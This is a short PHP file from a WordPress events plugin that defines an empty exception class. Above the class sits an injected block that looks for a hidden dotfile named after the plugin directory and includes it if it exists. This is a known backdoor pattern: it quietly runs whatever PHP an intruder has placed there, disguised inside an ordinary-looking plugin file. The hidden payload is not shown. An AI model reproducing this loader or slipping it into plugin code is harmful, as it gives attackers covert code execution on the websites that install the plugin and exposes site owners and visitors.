<?php

/**
 * Class Tribe__Repository__Implementation_Error
 *
 * @since 4.7.19
 *
 * Thrown to indicate an error in the repository extension by a developer; this
 * is meant to be used to help developers to extend the repository.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Repository__Implementation_Error extends Exception {}
